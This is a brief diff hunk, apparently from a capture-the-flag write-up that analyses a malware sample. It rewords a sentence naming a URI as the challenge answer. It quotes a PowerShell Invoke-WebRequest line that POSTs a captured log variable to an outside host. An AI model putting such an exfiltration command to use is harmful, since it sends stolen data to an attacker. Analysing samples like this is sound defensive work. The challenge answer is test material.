@@ -237,7 +237,7 @@ $ python3 hex_reader.txt > outputscript.txt
 ```
 Invoke-WebRequest -uri http://igrqt.invalid:8080 -Method Post -Body $global:log
 ```
-All we need is the url on this line to successfully complete the challenge.
+This seems to be the POST request the prompt is asking for. All we need is the URI ```http://igrqt.invalid:8080```to successfully complete the challenge.
 
 
 
